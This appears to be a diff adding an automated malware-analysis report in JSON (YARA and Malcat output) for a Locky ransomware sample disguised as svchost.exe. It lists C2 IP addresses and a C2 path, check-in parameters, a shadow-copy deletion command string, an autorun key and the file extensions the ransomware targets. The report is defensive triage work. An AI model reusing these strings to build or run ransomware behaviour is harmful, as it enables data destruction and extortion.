@@ -1,0 +1,6152 @@
+{
+  "_format": "pe",
+  "_sample_path": "/opt/samples/corpus/malware/28046c14ea3325885ee1e731cd0bcf9f38445df02675836b851cb2ae94c050eb/svchost.exe",
+  "_source": "deep_dive_agentic_checklist",
+  "yara": {
+    "rule_count": 24,
+    "matches": [
+      {
+        "rule": "domain",
+        "path": "/opt/samples/corpus/malware/28046c14ea3325885ee1e731cd0bcf9f38445df02675836b851cb2ae94c050eb/svchost.exe",
+        "strings": [
+          {
+            "id": "$domain_regex",
+            "offset": 0,
+            "length": 2,
+            "xor_key": null
+          }
+        ]
+      },
+      {
+        "rule": "IP",
+        "path": "/opt/samples/corpus/malware/28046c14ea3325885ee1e731cd0bcf9f38445df02675836b851cb2ae94c050eb/svchost.exe",
+        "strings": [
+          {
+            "id": "$ipv4",
+            "offset": 75759,
+            "length": 13,
+            "xor_key": null
+          },
+          {
+            "id": "$ipv6",
+            "offset": 96935,
+            "length": 2,
+            "xor_key": null
+          }
+        ]
+      },
+      {
+        "rule": "Locky_Ransomware_2",
+        "path": "/opt/samples/corpus/malware/28046c14ea3325885ee1e731cd0bcf9f38445df02675836b851cb2ae94c050eb/svchost.exe",
+        "strings": [
+          {
+            "id": "$a1",
+            "offset": 76020,
+            "length": 13,
+            "xor_key": null
+          },
+          {
+            "id": "$a2",
+            "offset": 76097,
+            "length": 13,
+            "xor_key": null
+          },
+          {
+            "id": "$a3",
+            "offset": 76110,
+            "length": 13,
+            "xor_key": null
+          },
+          {
+            "id": "$a4",
+            "offset": 76123,
+            "length": 13,
+            "xor_key": null
+          },
+          {
+            "id": "$a5",
+            "offset": 76136,
+            "length": 13,
+            "xor_key": null
+          },
+          {
+            "id": "$a6",
+            "offset": 76149,
+            "length": 12,
+            "xor_key": null
+          },
+          {
+            "id": "$a7",
+            "offset": 76700,
+            "length": 15,
+            "xor_key": null
+          }
+        ]
+      },
+      {
+        "rule": "contains_base64",
+        "path": "/opt/samples/corpus/malware/28046c14ea3325885ee1e731cd0bcf9f38445df02675836b851cb2ae94c050eb/svchost.exe",
+        "strings": [
+          {
+            "id": "$a",
+            "offset": 68984,
+            "length": 12,
+            "xor_key": null
+          }
+        ]
+      },
+      {
+        "rule": "System_Tools",
+        "path": "/opt/samples/corpus/malware/28046c14ea3325885ee1e731cd0bcf9f38445df02675836b851cb2ae94c050eb/svchost.exe",
+        "strings": []
+      },
+      {
+        "rule": "Dropper_Strings",
+        "path": "/opt/samples/corpus/malware/28046c14ea3325885ee1e731cd0bcf9f38445df02675836b851cb2ae94c050eb/svchost.exe",
+        "strings": [
+          {
+            "id": "$a0",
+            "offset": 76939,
+            "length": 18,
+            "xor_key": null
+          }
+        ]
+      },
+      {
+        "rule": "Misc_Suspicious_Strings",
+        "path": "/opt/samples/corpus/malware/28046c14ea3325885ee1e731cd0bcf9f38445df02675836b851cb2ae94c050eb/svchost.exe",
+        "strings": [
+          {
+            "id": "$a4",
+            "offset": 77068,
+            "length": 14,
+            "xor_key": null
+          }
+        ]
+      },
+      {
+        "rule": "Advapi_Hash_API",
+        "path": "/opt/samples/corpus/malware/28046c14ea3325885ee1e731cd0bcf9f38445df02675836b851cb2ae94c050eb/svchost.exe",
+        "strings": [
+          {
+            "id": "$advapi32",
+            "offset": 89940,
+            "length": 12,
+            "xor_key": null
+          },
+          {
+            "id": "$CryptCreateHash",
+            "offset": 89758,
+            "length": 15,
+            "xor_key": null
+          },
+          {
+            "id": "$CryptHashData",
+            "offset": 89838,
+            "length": 13,
+            "xor_key": null
+          },
+          {
+            "id": "$CryptAcquireContext",
+            "offset": 89592,
+            "length": 19,
+            "xor_key": null
+          }
+        ]
+      },
+      {
+        "rule": "IsPE32",
+        "path": "/opt/samples/corpus/malware/28046c14ea3325885ee1e731cd0bcf9f38445df02675836b851cb2ae94c050eb/svchost.exe",
+        "strings": []
+      },
+      {
+        "rule": "IsWindowsGUI",
+        "path": "/opt/samples/corpus/malware/28046c14ea3325885ee1e731cd0bcf9f38445df02675836b851cb2ae94c050eb/svchost.exe",
+        "strings": []
+      },
+      {
+        "rule": "HasRichSignature",
+        "path": "/opt/samples/corpus/malware/28046c14ea3325885ee1e731cd0bcf9f38445df02675836b851cb2ae94c050eb/svchost.exe",
+        "strings": [
+          {
+            "id": "$a0",
+            "offset": 200,
+            "length": 4,
+            "xor_key": null
+          }
+        ]
+      },
+      {
+        "rule": "VC8_Microsoft_Corporation",
+        "path": "/opt/samples/corpus/malware/28046c14ea3325885ee1e731cd0bcf9f38445df02675836b851cb2ae94c050eb/svchost.exe",
+        "strings": [
+          {
+            "id": "$a",
+            "offset": 15664,
+            "length": 10,
+            "xor_key": null
+          }
+        ]
+      },
+      {
+        "rule": "Microsoft_Visual_Cpp_8",
+        "path": "/opt/samples/corpus/malware/28046c14ea3325885ee1e731cd0bcf9f38445df02675836b851cb2ae94c050eb/svchost.exe",
+        "strings": [
+          {
+            "id": "$a",
+            "offset": 607,
+            "length": 82,
+            "xor_key": null
+          },
+          {
+            "id": "$b",
+            "offset": 33965,
+            "length": 10,
+            "xor_key": null
+          }
+        ]
+      },
+      {
+        "rule": "SEH_Save",
+        "path": "/opt/samples/corpus/malware/28046c14ea3325885ee1e731cd0bcf9f38445df02675836b851cb2ae94c050eb/svchost.exe",
+        "strings": [
+          {
+            "id": "$a",
+            "offset": 44005,
+            "length": 7,
+            "xor_key": null
+          }
+        ]
+      },
+      {
+        "rule": "SEH_Init",
+        "path": "/opt/samples/corpus/malware/28046c14ea3325885ee1e731cd0bcf9f38445df02675836b851cb2ae94c050eb/svchost.exe",
+        "strings": [
+          {
+            "id": "$a",
+            "offset": 44062,
+            "length": 6,
+            "xor_key": null
+          },
+          {
+            "id": "$b",
+            "offset": 23648,
+            "length": 7,
+            "xor_key": null
+          }
+        ]
+      },
+      {
+        "rule": "anti_dbg",
+        "path": "/opt/samples/corpus/malware/28046c14ea3325885ee1e731cd0bcf9f38445df02675836b851cb2ae94c050eb/svchost.exe",
+        "strings": [
+          {
+            "id": "$d1",
+            "offset": 77028,
+            "length": 12,
+            "xor_key": null
+          },
+          {
+            "id": "$c2",
+            "offset": 90574,
+            "length": 17,
+            "xor_key": null
+          }
+        ]
+      },
+      {
+        "rule": "network_http",
+        "path": "/opt/samples/corpus/malware/28046c14ea3325885ee1e731cd0bcf9f38445df02675836b851cb2ae94c050eb/svchost.exe",
+        "strings": [
+          {
+            "id": "$f1",
+            "offset": 90264,
+            "length": 11,
+            "xor_key": null
+          },
+          {
+            "id": "$c1",
+            "offset": 90084,
+            "length": 15,
+            "xor_key": null
+          },
+          {
+            "id": "$c2",
+            "offset": 90046,
+            "length": 12,
+            "xor_key": null
+          },
+          {
+            "id": "$c4",
+            "offset": 90246,
+            "length": 16,
+            "xor_key": null
+          },
+          {
+            "id": "$c5",
+            "offset": 90170,
+            "length": 17,
+            "xor_key": null
+          },
+          {
+            "id": "$c6",
+            "offset": 90104,
+            "length": 15,
+            "xor_key": null
+          },
+          {
+            "id": "$c7",
+            "offset": 90148,
+            "length": 15,
+            "xor_key": null
+          }
+        ]
+      },
+      {
+        "rule": "screenshot",
+        "path": "/opt/samples/corpus/malware/28046c14ea3325885ee1e731cd0bcf9f38445df02675836b851cb2ae94c050eb/svchost.exe",
+        "strings": [
+          {
+            "id": "$d1",
+            "offset": 89468,
+            "length": 9,
+            "xor_key": null
+          },
+          {
+            "id": "$d2",
+            "offset": 89260,
+            "length": 10,
+            "xor_key": null
+          },
+          {
+            "id": "$c2",
+            "offset": 89182,
+            "length": 5,
+            "xor_key": null
+          }
+        ]
+      },
+      {
+        "rule": "win_registry",
+        "path": "/opt/samples/corpus/malware/28046c14ea3325885ee1e731cd0bcf9f38445df02675836b851cb2ae94c050eb/svchost.exe",
+        "strings": [
+          {
+            "id": "$f1",
+            "offset": 89940,
+            "length": 12,
+            "xor_key": null
+          },
+          {
+            "id": "$c1",
+            "offset": 89700,
+            "length": 16,
+            "xor_key": null
+          },
+          {
+            "id": "$c2",
+            "offset": 89616,
+            "length": 13,
+            "xor_key": null
+          },
+          {
+            "id": "$c3",
+            "offset": 89632,
+            "length": 11,
+            "xor_key": null
+          },
+          {
+            "id": "$c4",
+            "offset": 89664,
+            "length": 14,
+            "xor_key": null
+          },
+          {
+            "id": "$c6",
+            "offset": 89632,
+            "length": 11,
+            "xor_key": null
+          }
+        ]
+      },
+      {
+        "rule": "win_token",
+        "path": "/opt/samples/corpus/malware/28046c14ea3325885ee1e731cd0bcf9f38445df02675836b851cb2ae94c050eb/svchost.exe",
+        "strings": [
+          {
+            "id": "$f1",
+            "offset": 89940,
+            "length": 12,
+            "xor_key": null
+          },
+          {
+            "id": "$c3",
+            "offset": 89796,
+            "length": 16,
+            "xor_key": null
+          }
+        ]
+      },
+      {
+        "rule": "win_files_operation",
+        "path": "/opt/samples/corpus/malware/28046c14ea3325885ee1e731cd0bcf9f38445df02675836b851cb2ae94c050eb/svchost.exe",
+        "strings": [
+          {
+            "id": "$f1",
+            "offset": 77028,
+            "length": 12,
+            "xor_key": null
+          },
+          {
+            "id": "$c1",
+            "offset": 88230,
+            "length": 9,
+            "xor_key": null
+          },
+          {
+            "id": "$c2",
+            "offset": 88328,
+            "length": 14,
+            "xor_key": null
+          },
+          {
+            "id": "$c3",
+            "offset": 88230,
+            "length": 9,
+            "xor_key": null
+          },
+          {
+            "id": "$c4",
+            "offset": 88316,
+            "length": 8,
+            "xor_key": null
+          }
+        ]
+      },
+      {
+        "rule": "Str_Win32_Wininet_Library",
+        "path": "/opt/samples/corpus/malware/28046c14ea3325885ee1e731cd0bcf9f38445df02675836b851cb2ae94c050eb/svchost.exe",
+        "strings": [
+          {
+            "id": "$wininet_lib",
+            "offset": 90264,
+            "length": 11,
+            "xor_key": null
+          }
+        ]
+      },
+      {
+        "rule": "Str_Win32_Internet_API",
+        "path": "/opt/samples/corpus/malware/28046c14ea3325885ee1e731cd0bcf9f38445df02675836b851cb2ae94c050eb/svchost.exe",
+        "strings": [
+          {
+            "id": "$wininet_call_closeh",
+            "offset": 90004,
+            "length": 19,
+            "xor_key": null
+          },
+          {
+            "id": "$wininet_call_readf",
+            "offset": 90246,
+            "length": 16,
+            "xor_key": null
+          },
+          {
+            "id": "$wininet_call_connect",
+            "offset": 90084,
+            "length": 15,
+            "xor_key": null
+          },
+          {
+            "id": "$wininet_call_open",
+            "offset": 90046,
+            "length": 12,
+            "xor_key": null
+          }
+        ]
+      },
+      {
+        "rule": "Str_Win32_Http_API",
+        "path": "/opt/samples/corpus/malware/28046c14ea3325885ee1e731cd0bcf9f38445df02675836b851cb2ae94c050eb/svchost.exe",
+        "strings": [
+          {
+            "id": "$wininet_call_httpr",
+            "offset": 90148,
+            "length": 15,
+            "xor_key": null
+          },
+          {
+            "id": "$wininet_call_httpq",
+            "offset": 90228,
+            "length": 13,
+            "xor_key": null
+          },
+          {
+            "id": "$wininet_call_httpo",
+            "offset": 90104,
+            "length": 15,
+            "xor_key": null
+          }
+        ]
+      }
+    ],
+    "engine": "yara-x",
+    "rules_compiled": 454,
+    "compile_errors": [
+      "/opt/samples/rules/flat/Android_Amtrckr_20160519.yar: error[E010]: unknown module `androguard`\n --> /opt/samples/rules/flat/Android_Amtrckr_20160519.yar:6:1\n  |\n6 | import \"androguard\"\n  | ^^^^^^^^^^^^^^^^^^^ module `androguard` not found",
+      "/opt/samples/rules/flat/Android_Backdoor.yar: error[E010]: unknown module `androguard`\n  --> /opt/samples/rules/flat/Android_Backdoor.yar:11:1\n   |\n11 | import \"androguard\"\n   | ^^^^^^^^^^^^^^^^^^^ module `androguard` not found",
+      "/opt/samples/rules/flat/MALW_Httpsd_ELF.yar: error[E009]: unknown identifier `is__elf`\n  --> /opt/samples/rules/flat/MALW_Httpsd_ELF.yar:54:14\n   |\n54 |          and is__elf\n   |              ^^^^^^^ this identifier has not been declared",
+      "/opt/samples/rules/flat/Android_Pink_Locker.yar: error[E010]: unknown module `androguard`\n  --> /opt/samples/rules/flat/Android_Pink_Locker.yar:10:1\n   |\n10 | import \"androguard\"\n   | ^^^^^^^^^^^^^^^^^^^ module `androguard` not found",
+      "/opt/samples/rules/flat/Android_pornClicker.yar: error[E010]: unknown module `androguard`\n --> /opt/samples/rules/flat/Android_pornClicker.yar:6:1\n  |\n6 | import \"androguard\"\n  | ^^^^^^^^^^^^^^^^^^^ module `androguard` not found",
+      "/opt/samples/rules/flat/Android_Spywaller.yar: error[E010]: unknown module `androguard`\n  --> /opt/samples/rules/flat/Android_Spywaller.yar:10:1\n   |\n10 | import \"androguard\"\n   | ^^^^^^^^^^^^^^^^^^^ module `androguard` not found",
+      "/opt/samples/rules/flat/Android_OmniRat.yar: error[E010]: unknown module `androguard`\n --> /opt/samples/rules/flat/Android_OmniRat.yar:6:1\n  |\n6 | import \"androguard\"\n  | ^^^^^^^^^^^^^^^^^^^ module `androguard` not found",
+      "/opt/samples/rules/flat/Wshell_ChineseSpam.yar: error[E014]: invalid regular expression\n  --> /opt/samples/rules/flat/Wshell_ChineseSpam.yar:17:42\n   |\n17 |         $c = /if ?\\(\\$_POST\\[Submit\\]\\) ?{/\n   |                                          ^ unclosed counted repetition\n   |\n   = note: did you mean `\\{` instead of `{`?",
+      "/opt/samples/rules/flat/Android_FakeBank_Fanta.yar: error[E010]: unknown module `androguard`\n --> /opt/samples/rules/flat/Android_FakeBank_Fanta.yar:6:1\n  |\n6 | import \"androguard\"\n  | ^^^^^^^^^^^^^^^^^^^ module `androguard` not found",
+      "/opt/samples/rules/flat/Android_AliPay_smsStealer.yar: error[E010]: unknown module `androguard`\n  --> /opt/samples/rules/flat/Android_AliPay_smsStealer.yar:11:1\n   |\n11 | import \"androguard\"\n   | ^^^^^^^^^^^^^^^^^^^ module `androguard` not found"
+    ],
+    "incomplete": true
+  },
+  "malcat": {
+    "analysis_id": 1,
+    "path": "/opt/samples/corpus/malware/28046c14ea3325885ee1e731cd0bcf9f38445df02675836b851cb2ae94c050eb/svchost.exe",
+    "profile": "deep",
+    "limits": {
+      "strings_max": 300,
+      "imports_max": 300,
+      "functions_max": 30,
+      "anomaly_locations_max": 50,
+      "decompile_top_n": 3
+    },
+    "file_summary": {
+      "analysis_id": 1,
+      "file_name": "svchost.exe",
+      "file_path": "/opt/samples/corpus/malware/28046c14ea3325885ee1e731cd0bcf9f38445df02675836b851cb2ae94c050eb/svchost.exe",
+      "file_size": 104448,
+      "type": "PE",
+      "architecture": "X86",
+      "entropy": 6.13,
+      "sha256": "28046c14ea3325885ee1e731cd0bcf9f38445df02675836b851cb2ae94c050eb",
+      "metadata": {},
+      "entrypoint_ea": 40820,
+      "layout": [
+        {
+          "name": "header",
+          "effective_address": 0,
+          "physical_size": 1024,
+          "virtual_size": 0,
+          "rights": "",
+          "entropy": 44
+        },
+        {
+          "name": ".text",
+          "effective_address": 1024,
+          "physical_size": 64512,
+          "virtual_size": 65536,
+          "rights": "RX",
+          "entropy": 140
+        },
+        {
+          "name": ".rdata",
+          "effective_address": 66560,
+          "physical_size": 26112,
+          "virtual_size": 28672,
+          "rights": "R",
+          "entropy": 70
+        },
+        {
+          "name": ".data",
+          "effective_address": 95232,
+          "physical_size": 3584,
+          "virtual_size": 8192,
+          "rights": "RW",
+          "entropy": 60
+        },
+        {
+          "name": ".reloc",
+          "effective_address": 103424,
+          "physical_size": 9216,
+          "virtual_size": 12288,
+          "rights": "R",
+          "entropy": 67
+        }
+      ],
+      "kesakode_verdict": [],
+      "entropy_malcat_raw": 116,
+      "entropy_source": "whole_file_shannon_revai"
+    },
+    "views": {
+      "anomalies": [
+        {
+          "name": "CryptoApiUsage",
+          "desc": "Crypto-related apis are used",
+          "category": "imports",
+          "level": 2,
+          "num_hits": 24
+        },
+        {
+          "name": "DownloaderApiUsage",
+          "desc": "Downloader-related apis are used",
+          "category": "imports",
+          "level": 2,
+          "num_hits": 2
+        },
+        {
+          "name": "NoChecksum",
+          "desc": "PE Header checksum is not set",
+          "category": "integrity",
+          "level": 1,
+          "num_hits": 1
+        },
+        {
+          "name": "RichMultipleLinkers",
+          "desc": "multiple linker entries in rich header",
+          "category": "rich",
+          "level": 3,
+          "num_hits": 1
+        },
+        {
+          "name": "SpaghettiFunction",
+          "desc": "Function with lots of intra jumps, could be obfuscated",
+          "category": "code",
+          "level": 1,
+          "num_hits": 3
+        },
+        {
+          "name": "StackArrayInitialisationX86",
+          "desc": "An array of data is dynamically built on the stack, sometimes used to build shellcodes or strings",
+          "category": "code",
+          "level": 3,
+          "num_hits": 1
+        },
+        {
+          "name": "XorInLoop",
+          "desc": "XOR instruction in a loop",
+          "category": "code",
+          "level": 3,
+          "num_hits": 15
+        }
+      ],
+      "anomaly_locations": {
+        "CryptoApiUsage": [
+          {
+            "ea": 9086,
+            "context": ""
+          },
+          {
+            "ea": 9111,
+            "context": ""
+          },
+          {
+            "ea": 9209,
+            "context": ""
+          },
+          {
+            "ea": 10276,
+            "context": ""
+          },
+          {
+            "ea": 10323,
+            "context": ""
+          }
+        ],
+        "NoChecksum": [
+          {
+            "ea": 304,
+            "context": ""
+          }
+        ],
+        "SpaghettiFunction": [
+          {
+            "ea": 37520,
+            "context": ""
+          },
+          {
+            "ea": 48631,
+            "context": ""
+          },
+          {
+            "ea": 56272,
+            "context": ""
+          }
+        ],
+        "XorInLoop": [
+          {
+            "ea": 1653,
+            "context": ""
+          },
+          {
+            "ea": 1699,
+            "context": ""
+          },
+          {
+            "ea": 2895,
+            "context": ""
+          },
+          {
+            "ea": 3470,
+            "context": ""
+          },
+          {
+            "ea": 25609,
+            "context": ""
+          }
+        ]
+      },
+      "yara_hits": [
+        {
+          "id": "MSVC_2002_linker",
+          "category": "compiler",
+          "reliability": 60,
+          "type": "INFO",
+          "description": "detects used visual studio version based on linker information",
+          "num_patterns": 0
+        },
+        {
+          "id": "MSVC_2003_rich",
+          "category": "compiler",
+          "reliability": 80,
+          "type": "INFO",
+          "description": "detects used visual studio version based on rich header information",
+          "num_patterns": 0
+        },
+        {
+          "id": "ZoneAlternateStream",
+          "category": "network",
+          "reliability": 60,
+          "type": "UNCOMMON",
+          "description": "program tries to manipulate internet alternate streams",
+          "num_patterns": 1
+        },
+        {
+          "id": "DownloadUsingWininet",
+          "category": "network",
+          "reliability": 60,
+          "type": "UNCOMMON",
+          "description": "can download files from internet using wininet API",
+          "num_patterns": 1
+        },
+        {
+          "id": "AccessNetworkShares",
+          "category": "network",
+          "reliability": 70,
+          "type": "SUSPICIOUS",
+          "description": "may access network shares",
+          "num_patterns": 2
+        },
+        {
+          "id": "FingerprintHardware",
+          "category": "fingerprint",
+          "reliability": 50,
+          "type": "UNCOMMON",
+          "description": "tries to enumerate installed hardware",
+          "num_patterns": 2
+        },
+        {
+          "id": "AutorunKey",
+          "category": "persistence",
+          "reliability": 20,
+          "type": "UNCOMMON",
+          "description": "file contains path of an autorun key",
+          "num_patterns": 1
+        },
+        {
+          "id": "DeletesVssShadowCopy",
+          "category": "destruction",
+          "reliability": 80,
+          "type": "SUSPICIOUS",
+          "description": "attempts to remove vss shadow copies, a classical ransomware move",
+          "num_patterns": 1
+        },
+        {
+          "id": "ValuableFileExtensions",
+          "category": "destruction",
+          "reliability": 10,
+          "type": "UNCOMMON",
+          "description": "embeds a list of file extensions often targeted by ransomwares",
+          "num_patterns": 26
+        },
+        {
+          "id": "RunShell",
+          "category": "lateral movement",
+          "reliability": 70,
+          "type": "UNCOMMON",
+          "description": "starts a shell",
+          "num_patterns": 2
+        }
+      ],
+      "strings": [
+        {
+          "ea": 77936,
+          "summary": "Software\\Microso..rrentVersion\\Run"
+        },
+        {
+          "ea": 77856,
+          "summary": "vssadmin.exe Del..dows /All /Quiet"
+        },
+        {
+          "ea": 78092,
+          "summary": "cmd.exe /C del /Q /F \""
+        },
+        {
+          "ea": 77796,
+          "summary": ":Zone.Identifier"
+        },
+        {
+          "ea": 78988,
+          "summary": ".tar.bz2"
+        },
+        {
+          "ea": 79072,
+          "summary": ".rar"
+        },
+        {
+          "ea": 79800,
+          "summary": ".001"
+        },
+        {
+          "ea": 80284,
+          "summary": ".xlsx"
+        },
+        {
+          "ea": 80092,
+          "summary": ".pptx"
+        },
+        {
+          "ea": 77584,
+          "summary": "\\_Locky_recover_instructions.bmp"
+        },
+        {
+          "ea": 78916,
+          "summary": ".vmdk"
+        },
+        {
+          "ea": 80488,
+          "summary": ".docm"
+        },
+        {
+          "ea": 80500,
+          "summary": ".docx"
+        },
+        {
+          "ea": 79192,
+          "summary": ".jpeg"
+        },
+        {
+          "ea": 80296,
+          "summary": ".xlsm"
+        },
+        {
+          "ea": 80752,
+          "summary": ".crt"
+        },
+        {
+          "ea": 80716,
+          "summary": ".pem"
+        },
+        {
+          "ea": 80620,
+          "summary": ".pdf"
+        },
+        {
+          "ea": 80200,
+          "summary": ".odp"
+        },
+        {
+          "ea": 79628,
+          "summary": ".sql"
+        },
+        {
+          "ea": 80548,
+          "summary": ".3ds"
+        },
+        {
+          "ea": 78744,
+          "summary": ".mp4"
+        },
+        {
+          "ea": 78756,
+          "summary": ".mov"
+        },
+        {
+          "ea": 78768,
+          "summary": ".avi"
+        },
+        {
+          "ea": 78876,
+          "summary": ".mp3"
+        },
+        {
+          "ea": 79032,
+          "summary": ".tar"
+        },
+        {
+          "ea": 79144,
+          "summary": ".png"
+        },
+        {
+          "ea": 79204,
+          "summary": ".jpg"
+        },
+        {
+          "ea": 80428,
+          "summary": ".ods"
+        },
+        {
+          "ea": 77120,
+          "summary": "\\_Locky_recover_instructions.txt"
+        },
+        {
+          "ea": 78172,
+          "summary": "rupweuinytpmusfr..euknltf/main.php"
+        },
+        {
+          "ea": 77008,
+          "summary": "0123456789ABCDEF"
+        },
+        {
+          "ea": 79084,
+          "summary": ".zip"
+        },
+        {
+          "ea": 79044,
+          "summary": ".tgz"
+        },
+        {
+          "ea": 77772,
+          "summary": "svchost.exe"
+        },
+        {
+          "ea": 70024,
+          "summary": "mscoree.dll"
+        },
+        {
+          "ea": 80776,
+          "summary": "wallet.dat"
+        },
+        {
+          "ea": 73192,
+          "summary": "USER32.DLL"
+        },
+        {
+          "ea": 78140,
+          "summary": "0123456789ABCDEF"
+        },
+        {
+          "ea": 78304,
+          "summary": "_Locky_recover_instructions.txt"
+        },
+        {
+          "ea": 78240,
+          "summary": "_Locky_recover_instructions.bmp"
+        },
+        {
+          "ea": 76783,
+          "summary": "91.195.12.187,19..,188.127.231.116"
+        },
+        {
+          "ea": 90112,
+          "summary": "GetVolumeInformationW"
+        },
+        {
+          "ea": 77724,
+          "summary": "Software\\Locky"
+        },
+        {
+          "ea": 91270,
+          "summary": "InternetReadFile"
+        },
+        {
+          "ea": 78052,
+          "summary": "kernel32.dll"
+        },
+        {
+          "ea": 77460,
+          "summary": "Windows Server 2..echnical Preview"
+        },
+        {
+          "ea": 91318,
+          "summary": "WNetEnumResourceW"
+        },
+        {
+          "ea": 78020,
+          "summary": "Wow64DisableWow64FsRedirection"
+        },
+        {
+          "ea": 91000,
+          "summary": "ShellExecuteW"
+        },
+        {
+          "ea": 73092,
+          "summary": "GetProcessWindowStation"
+        },
+        {
+          "ea": 91302,
+          "summary": "WNetOpenEnumW"
+        },
+        {
+          "ea": 77224,
+          "summary": "&act=stats&path="
+        },
+        {
+          "ea": 73116,
+          "summary": "GetUserObjectInformationW"
+        },
+        {
+          "ea": 77696,
+          "summary": "TileWallpaper"
+        },
+        {
+          "ea": 77832,
+          "summary": "&act=gettext&lang="
+        },
+        {
+          "ea": 90136,
+          "summary": "GetLogicalDrives"
+        },
+        {
+          "ea": 77680,
+          "summary": "WallpaperStyle"
+        },
+        {
+          "ea": 77652,
+          "summary": "Control Panel\\Desktop"
+        },
+        {
+          "ea": 67396,
+          "summary": "Unknown exception"
+        },
+        {
+          "ea": 73144,
+          "summary": "GetLastActivePopup"
+        },
+        {
+          "ea": 77556,
+          "summary": "&act=getkey&affid="
+        },
+        {
+          "ea": 77500,
+          "summary": "unknown"
+        },
+        {
+          "ea": 78212,
+          "summary": "http://"
+        },
+        {
+          "ea": 70924,
+          "summary": "FlsFree"
+        },
+        {
+          "ea": 70956,
+          "summary": "FlsAlloc"
+        },
+        {
+          "ea": 77096,
+          "summary": "invalid string position"
+        },
+        {
+          "ea": 78068,
+          "summary": "IsWow64Process"
+        },
+        {
+          "ea": 78160,
+          "summary": "HTTP/1.1"
+        },
+        {
+          "ea": 77424,
+          "summary": "Windows Server 2012 R2"
+        },
+        {
+          "ea": 77356,
+          "summary": "Windows Server 2008 R2"
+        },
+        {
+          "ea": 70008,
+          "summary": "CorExitProcess"
+        },
+        {
+          "ea": 73164,
+          "summary": "GetActiveWindow"
+        },
+        {
+          "ea": 77044,
+          "summary": ".locky"
+        },
+        {
+          "ea": 76996,
+          "summary": ".tmp"
+        },
+        {
+          "ea": 77392,
+          "summary": "Windows Server 2012"
+        },
+        {
+          "ea": 77324,
+          "summary": "Windows Server 2008"
+        },
+        {
+          "ea": 73180,
+          "summary": "MessageBoxW"
+        },
+        {
+          "ea": 70932,
+          "summary": "FlsSetValue"
+        },
+        {
+          "ea": 77712,
+          "summary": "open"
+        },
+        {
+          "ea": 70944,
+          "summary": "FlsGetValue"
+        },
+        {
+          "ea": 77984,
+          "summary": "Locky"
+        },
+        {
+          "ea": 77576,
+          "summary": "Tahoma"
+        },
+        {
+          "ea": 77308,
+          "summary": "Windows Vista"
+        },
+        {
+          "ea": 77292,
+          "summary": "Windows 2003 R2"
+        },
+        {
+          "ea": 78540,
+          "summary": "$Recycle.Bin"
+        },
+        {
+          "ea": 77080,
+          "summary": "string too long"
+        },
+        {
+          "ea": 78520,
+          "summary": "thumbs.db"
+        },
+        {
+          "ea": 76980,
+          "summary": "bad allocation"
+        },
+        {
+          "ea": 77060,
+          "summary": "vector<T> too long"
+        },
+        {
+          "ea": 77276,
+          "summary": "Windows 2003"
+        },
+        {
+          "ea": 80828,
+          "summary": "bad exception"
+        },
+        {
+          "ea": 91288,
+          "summary": "WININET.dll"
+        },
+        {
+          "ea": 77212,
+          "summary": "&encrypted="
+        },
+        {
+          "ea": 77744,
+          "summary": "pubkey"
+        },
+        {
+          "ea": 77996,
+          "summary": "Locky"
+        },
+        {
+          "ea": 78568,
+          "summary": "System Volume Information"
+        },
+        {
+          "ea": 78220,
+          "summary": "POST"
+        },
+        {
+          "ea": 91014,
+          "summary": "SHELL32.dll"
+        },
+        {
+          "ea": 90170,
+          "summary": "KERNEL32.dll"
+        },
+        {
+          "ea": 77752,
+          "summary": "paytext"
+        },
+        {
+          "ea": 77412,
+          "summary": "Windows 8.1"
+        },
+        {
+          "ea": 90964,
+          "summary": "ADVAPI32.dll"
+        },
+        {
+          "ea": 71608,
+          "summary": "`eh vector vbase..ructor iterator'"
+        },
+        {
+          "ea": 71464,
+          "summary": "`vector vbase co..ructor iterator'"
+        },
+        {
+          "ea": 77448,
+          "summary": "Windows 10"
+        },
+        {
+          "ea": 71976,
+          "summary": "`eh vector vbase..ructor iterator'"
+        },
+        {
+          "ea": 77248,
+          "summary": "Windows 2000"
+        },
+        {
+          "ea": 77380,
+          "summary": "Windows 8"
+        },
+        {
+          "ea": 77264,
+          "summary": "Windows XP"
+        },
+        {
+          "ea": 71420,
+          "summary": "`managed vector ..ructor iterator'"
+        },
+        {
+          "ea": 77344,
+          "summary": "Windows 7"
+        },
+        {
+          "ea": 77760,
+          "summary": "completed"
+        },
+        {
+          "ea": 77200,
+          "summary": "&failed="
+        },
+        {
+          "ea": 77188,
+          "summary": "&length="
+        },
+        {
+          "ea": 71732,
+          "summary": "`managed vector ..ructor iterator'"
+        },
+        {
+          "ea": 72112,
+          "summary": "`vector vbase co..ructor iterator'"
+        },
+        {
+          "ea": 91438,
+          "summary": "NETAPI32.dll"
+        },
+        {
+          "ea": 90284,
+          "summary": "USER32.dll"
+        },
+        {
+          "ea": 91374,
+          "summary": "MPR.dll"
+        },
+        {
+          "ea": 78388,
+          "summary": "Application Data"
+        },
+        {
+          "ea": 90492,
+          "summary": "GDI32.dll"
+        },
+        {
+          "ea": 71868,
+          "summary": "`local vftable c..tructor closure'"
+        },
+        {
+          "ea": 71692,
+          "summary": "`managed vector ..ructor iterator'"
+        },
+        {
+          "ea": 71652,
+          "summary": "`eh vector copy ..ructor iterator'"
+        },
+        {
+          "ea": 72048,
+          "summary": "`eh vector constructor iterator'"
+        },
+        {
+          "ea": 73986,
+          "summary": "         h((((  ..               H"
+        },
+        {
+          "ea": 77548,
+          "summary": "&lang="
+        },
+        {
+          "ea": 77532,
+          "summary": "&serv="
+        },
+        {
+          "ea": 71508,
+          "summary": "`vector copy con..ructor iterator'"
+        },
+        {
+          "ea": 77540,
+          "summary": "&corp="
+        },
+        {
+          "ea": 72180,
+          "summary": "`vector constructor iterator'"
+        },
+        {
+          "ea": 67460,
+          "summary": "runtime error "
+        },
+        {
+          "ea": 72016,
+          "summary": "`eh vector destructor iterator'"
+        },
+        {
+          "ea": 77508,
+          "summary": "&x64="
+        },
+        {
+          "ea": 72148,
+          "summary": "`vector destructor iterator'"
+        },
+        {
+          "ea": 72244,
+          "summary": "`default constructor closure'"
+        },
+        {
+          "ea": 78424,
+          "summary": "AppData"
+        },
+        {
+          "ea": 77524,
+          "summary": "&os="
+        },
+        {
+          "ea": 77516,
+          "summary": "&sp="
+        },
+        {
+          "ea": 71948,
+          "summary": "`copy constructor closure'"
+        },
+        {
+          "ea": 72624,
+          "summary": "__clrcall"
+        },
+        {
+          "ea": 79880,
+          "summary": ".ms11 (Security copy)"
+        },
+        {
+          "ea": 71544,
+          "summary": "`dynamic atexit destructor for '"
+        },
+        {
+          "ea": 72212,
+          "summary": "`scalar deleting destructor'"
+        },
+        {
